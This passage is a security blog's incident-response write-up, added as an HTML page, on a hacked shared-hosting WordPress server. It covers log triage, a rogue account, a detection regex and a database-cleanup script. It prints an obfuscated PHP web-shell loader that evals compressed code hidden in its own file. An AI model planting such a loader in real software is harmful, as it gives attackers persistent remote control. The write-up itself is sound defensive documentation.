@@ -1,0 +1,1316 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Cybersecurity Research">
+      
+      
+        <meta name="author" content="8iker_4n0n">
+      
+      
+      
+        <link rel="prev" href="../..">
+      
+      
+        <link rel="next" href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Polymorphic Web Shell — Incident Response - 8iker_4n0n Security Research</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#polymorphic-web-shell-incident-response" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="8iker_4n0n Security Research" class="md-header__button md-logo" aria-label="8iker_4n0n Security Research" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            8iker_4n0n Security Research
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Polymorphic Web Shell — Incident Response
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+    
+  
+  IR Reports
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Malware Analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="8iker_4n0n Security Research" class="md-nav__button md-logo" aria-label="8iker_4n0n Security Research" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    8iker_4n0n Security Research
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IR Reports
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IR Reports
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Polymorphic Web Shell — Incident Response
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Polymorphic Web Shell — Incident Response
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#log-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Log analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#looking-for-established-connections-and-odd-user-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Looking For Established Connections and Odd User Accounts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding Persistence
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cleaning-up-the-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cleaning Up The Database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Environment
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Timeline
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#malicious-scripts-truncated-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Malicious Scripts (Truncated List)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attacker-ips" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacker IPs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#indicators-of-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malware Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Malware Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Polymorphic Web Shell — Malware Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#log-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Log analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#looking-for-established-connections-and-odd-user-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Looking For Established Connections and Odd User Accounts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding Persistence
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cleaning-up-the-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cleaning Up The Database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Environment
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Timeline
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#malicious-scripts-truncated-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Malicious Scripts (Truncated List)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attacker-ips" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacker IPs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitre-attck-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#indicators-of-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Indicators of Compromise
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Remediation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="polymorphic-web-shell-incident-response">Polymorphic Web Shell — Incident Response</h1>
+<h2 id="overview">Overview</h2>
+<p>The following report is a condensed write-up regarding an incident response on a compromised server I was tasked with securing after the fact.
+A shared-hosting web server managed via cPanel/WHM, hosting multiple WordPress sites across several accounts, was identified as compromised. Indicators point to a multi-account breach involving server-side web shells and large-scale content injection.  </p>
+<p>The malware found was not detected by using any AV scans or security plugins, but through manual investigation and regex. All connections to the compromised server was done through my own private VPN connection to hide my own public IP address. I intentionally exclude some discoveries from</p>
+<p>The investigation prioritised, in order: evidence preservation, assessment of live attacker activity, containment, and root-cause identification.</p>
+<p>Shout out to the following researchers who's content made this possible:<br />
+<strong>John Strand, Low Level, Hack The Clown, John Hammond, Nahamsec, Tomnomnom</strong></p>
+<p>Disclaimer: Both <strong>Gemini 3.1 Pro</strong> and <strong>Claude Opus 4.8</strong> were used to assist me in the investigation. The AI models were used to help me with research on discoveries made and to support me with additional commands I used to discover anomalies. </p>
+<blockquote>
+<p>See the companion <a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/">Malware Analysis</a> for breakdown of the shell's obfuscation and polymorphism mechanisms.</p>
+</blockquote>
+<hr />
+<h2 id="introduction">Introduction</h2>
+<p>The client contacted me, explaining that his server (which I had not seen before) has been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to <code>https://ushort.dev</code> and other similar URLs.  </p>
+<p>I intentionally left out some parts of this investigation to prevent a bloated blog. But one of the early actions I took when accessing the server via SSH was to grep for the <code>ushort</code> string in the webroot of one of the affected sites to see what files come up. This only reveal temporary logs from cPanel based on actions already taken by the user which is what lead me to take a different approach.</p>
+<hr />
+<h2 id="log-analysis">Log analysis</h2>
+<p>The WHM management interface allowed me to view active processes and network logs. The active processes and first view logs did not reveal anything. When looking through the <code>Daily Process Log</code> in WHM, I saw a sudden spike (23%) in the previous day's (June 18 2026) memory usage. This memory usage came from the <code>httpd</code> process. Now 23% is not much for a web server but when compared to the current day (0.3%) it seemed very odd.</p>
+<p>I then looked at the bandwidth usage for each month by site. This then revealed a massive amount of data usage for about 7 sites. As the sites are not hosting video content or image downloads, this seemed strange so I jumped back many months until I saw a drop in bandwidth usage. I discovered that prior to February 2026, the average bandwidth usage was between <strong>7GB</strong> to <strong>9GB</strong> but in Feburary there was an additional 20GB. Looking through the other months, the maximum usage for one particular site was <strong>32.26GB</strong>.</p>
+<p>Upon further investigation, I found that the most targeted file in the requests sent was <code>xmlrpc.php</code>, about 100,000+ requests within a 3 month span. I remember from the past this this was a vulnerable file in the past. I did a quick search and discovered that this legacy file has been used in past exploits to brute force user accounts. This is what I believe was used to brute-force user accounts and gain access to file upload capabilities through an administrator account.</p>
+<hr />
+<h2 id="looking-for-established-connections-and-odd-user-accounts">Looking For Established Connections and Odd User Accounts</h2>
+<p>Before continuing, I told myself not to underestimate the attackers and be sure of my next actions. The next thing I was using the <code>Terminal</code> function in WHM to get a root shell. I then ran the following commands to check for strange user accounts.</p>
+<pre><code class="language-bash"># Find user accounts with bash shell access
+grep &quot;/bin/bash&quot; /etc/passwd
+sort -n -t: /etc/passwd | grep -vE &quot;nologin|noshell|false|halt|shutdown|sync&quot;
+
+# This shows the last authenticated SSH logins
+last
+
+# Check if the user creation is in the root's bash history
+grep &quot;USERNAME&quot; ~/.bash_history
+</code></pre>
+<p>I found a user that stood out to me. I then found the user creation command in the root user's bash history account. The bash history had unix timestamps enabled and that user was created (according to the history timestamp) a minute before two other accounts which I know to be official.
+But when looking at <code>last</code> command's output, I enumerated their IP address with <code>ip-api.com</code> JSON API which showed me the user was connecting from a static IP in Washington DC. </p>
+<p>None of the official users were in the USA so I flagged it and confirmed with my client. No one to his knowledge was operating out of the States. I didn't take any action on the user account yet as I wanted to script the removal of any connections and user accounts to prevent any counter attacks should the attackers be actively monitoring such actions.</p>
+<p>I then looked at all the processes and their child processes but this didn't reveal anything interesting. But the active network connections showed ESTABLISHED connections to foreign IP addresses (listed under 'Attacker IPs'). I found active connections on port 111 and immediately killed the process and masked the service.</p>
+<pre><code class="language-bash"># Processes and there child processes
+ps -auxf
+
+# All open files showing process IDs and Connection status - Credit: John Strand
+lsof -i -P
+</code></pre>
+<p>I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geolock the server to disconnect any foreign clients immediately making it easier to work on and clean up. I then added the geolock and locked some of the ports I saw which were open and added the global xmlrpc deny rule, and blocked and removed the strange SSH user account.</p>
+<hr />
+<h2 id="finding-persistence">Finding Persistence</h2>
+<p>I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts.</p>
+<p>The focus then turned to the /home directory and Claude gave me the following line:</p>
+<pre><code class="language-bash">stat /home/user/public_html/shell.php
+</code></pre>
+<p>My first thought was "who would be stupid enough to leave a malicious script on a server named script.php?". I laughed and said to myself, "What the hell, let's just see what comes up"</p>
+<pre><code class="language-bash"># Find all the files under the /home directory named script
+find /home -name &quot;script.php&quot; &gt; script_file_find_output.txt
+</code></pre>
+<p>So I looked at the output and about the 10th line down, one line immediately stood out:<br />
+<strong><code>/home/REDACTED/cpmove.psql.1312886056/teaniou/ytdkrwn/iazvlpc/shell.php</code></strong><br />
+This did not look normal but rather looked like an attempt to make it look like a temporary path of sorts or was a randomly generated path. I then opened it up with <code>vi</code> and had a look...
+At this point my heart started racing from excitement, I'm sure we all know the feeling. This is what I saw:</p>
+<pre><code class="language-php">&lt;?php
+$JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr';$DPAQ='st'.'r'.''.'re'.'place';$TprW='e'.'xit';eval($YrdE($DPAQ('xpkzchjbsq','&gt;',$DPAQ('qpfxhbaelk','&lt;',$esyt($JIzk( _FILE_ ),-217718)))));$TprW(0);
+?&gt;
+</code></pre>
+<p>BOOM! Text book obfuscation, great. I then went back to my text file and looked for more paths like it and found another 3 of them:<br />
+<strong><code>/home/REDACTED/public_html/images/npmrlch/cywartd/vjaqbug/shell.php</code></strong><br />
+<strong><code>/home/REDACTED/public_html/modules/mod_login/elhywdo/cuywi1b/bwsax1e/shell.php</code></strong><br />
+<strong><code>/home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php</code></strong><br />
+In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all <strong><code>(__FILE__),-OFFSET</code></strong><br />
+I then asked Claude to give me the best way to find all of these files across the file system using this regex <strong><code>\( __FILE__ \),-[0-9]+</code></strong> </p>
+<pre><code class="language-bash"># Find all the php files with this pattern in them under first all the webroot folders then the filesystem
+grep -rnP '\( __FILE__ \),-[0-9]+' --include=&quot;*.php&quot; /home/*/public_html/ &gt;&gt; possible_malware.txt
+grep -rnP '\( __FILE__ \),-[0-9]+' --include=&quot;*.php&quot; / &gt;&gt; possible_malware.txt
+
+# Using some vi magic, I quickly got a unique list
+:%!sort -u
+</code></pre>
+<p>I started with only the webroots but after seeing how quickly it output results outside of what I had already found, I then switched to the root filesystem. A few minutes later, I sat with a 216 unique instances across the file system.  </p>
+<blockquote>
+<p>See the companion <a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/">Malware Analysis</a> for breakdown of the shell's obfuscation and polymorphism mechanisms.</p>
+</blockquote>
+<hr />
+<h2 id="cleaning-up-the-database">Cleaning Up The Database</h2>
+<p>The next thing I had to check were the database tables. The following tables were found to have the <code>ushort</code> redirects in them:</p>
+<ul>
+<li>wp-posts</li>
+<li>wp-options</li>
+</ul>
+<p>In wp-options the <strong>home</strong> column had a <code>ushort</code> link in it, redirecting any visitor to the phising site.
+A custom bash script was used to clean up all the database entries.</p>
+<pre><code class="language-bash">#!/usr/bin/bash
+WP_CLI=&quot;/usr/local/bin/wp&quot;
+REGEX_META='&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+&quot; \/&gt;\s*'
+REGEX_SCRIPT='&lt;script&gt;window\.location\.href = &quot;https?:\/\/ushort\.[a-z]+\/[a-zA-Z0-9]+&quot;;&lt;\/script&gt;\s*'
+
+declare -A SEEN
+
+for user in $(ls -1 /var/cpanel/users | grep -v system); do
+  for user_file in /var/cpanel/userdata/$user/*; do
+    # only JSON cache files parse; skip YAML/_SSL silently
+    jq -e . &quot;$user_file&quot; &gt;/dev/null 2&gt;&amp;1 || continue
+    DOCROOT=$(jq -r '.documentroot // empty' &quot;$user_file&quot; 2&gt;/dev/null)
+    PHP_VER=$(jq -r '.phpversion // empty'   &quot;$user_file&quot; 2&gt;/dev/null)
+    [[ -z &quot;$DOCROOT&quot; || -z &quot;$PHP_VER&quot; ]] &amp;&amp; continue
+    [[ -n &quot;${SEEN[$DOCROOT]}&quot; ]] &amp;&amp; continue          # dedupe docroots
+    SEEN[$DOCROOT]=1
+
+    PHP_CLI=&quot;/opt/cpanel/$PHP_VER/root/usr/bin/php&quot;
+    RUN=&quot;sudo -u $user /bin/bash -c&quot;
+
+    # skip non-WP docroots silently
+    $RUN &quot;$PHP_CLI $WP_CLI core is-installed --path='$DOCROOT'&quot; 2&gt;/dev/null || continue
+
+    meta=$($RUN &quot;$PHP_CLI $WP_CLI search-replace '$REGEX_META' '' --path='$DOCROOT' --regex --regex-flags='i'&quot; 2&gt;/dev/null \
+           | grep -oiP 'Success:.*?\K\d+')
+    scr=$($RUN  &quot;$PHP_CLI $WP_CLI search-replace '$REGEX_SCRIPT' '' --path='$DOCROOT' --regex --regex-flags='i'&quot; 2&gt;/dev/null \
+           | grep -oiP 'Success:.*?\K\d+')
+
+    # ground truth: distinct infected post rows
+    PREFIX=$($RUN &quot;$PHP_CLI $WP_CLI config get table_prefix --path='$DOCROOT'&quot; 2&gt;/dev/null)
+    rows=$($RUN &quot;$PHP_CLI $WP_CLI db query \&quot;SELECT COUNT(*) FROM ${PREFIX}posts WHERE post_content LIKE '%ushort.%'\&quot; --skip-column-names --path='$DOCROOT'&quot; 2&gt;/dev/null)
+
+    printf '%-12s %-40s META=%-5s SCRIPT=%-5s ROWS=%s\n' \
+           &quot;$user&quot; &quot;$DOCROOT&quot; &quot;${meta:-0}&quot; &quot;${scr:-0}&quot; &quot;${rows:-0}&quot;
+  done
+done
+</code></pre>
+<hr />
+<h2 id="conclusion">Conclusion</h2>
+<p>At this point it was about 4AM and had to get ready for my day job. I compiled my hours,findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.  </p>
+<p>If anything seen in this blog is incorrect, can be improved or you would like to offer any advice, I welcome it. I'd rather be wrong and learn, than to remain ignorant.</p>
+<hr />
+<h2 id="environment">Environment</h2>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Operating System</td>
+<td>AlmaLinux 9.8 (Olive Jaguar)</td>
+</tr>
+<tr>
+<td>Hosting Model</td>
+<td>Shared hosting, multiple cPanel accounts</td>
+</tr>
+<tr>
+<td>Application</td>
+<td>WordPress (mixed cored and plugin versions across sites)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="timeline">Timeline</h2>
+<table>
+<thead>
+<tr>
+<th>Time (UTC)</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2026-06-19 19:28</td>
+<td>Analysis of WHM active processes and network logs</td>
+</tr>
+<tr>
+<td>2026-06-19 20:47</td>
+<td>Discovery of HTTP traffic anomalies</td>
+</tr>
+<tr>
+<td>2026-06-19 21:19</td>
+<td>Discovery of most requested file via HTTP requests</td>
+</tr>
+<tr>
+<td>2026-06-19 23:45</td>
+<td>Discovery of polymorphic shell</td>
+</tr>
+<tr>
+<td>2026-06-20 00:33</td>
+<td>Quarantine, archival and removing of all malware found</td>
+</tr>
+<tr>
+<td>2026-06-20 01:54</td>
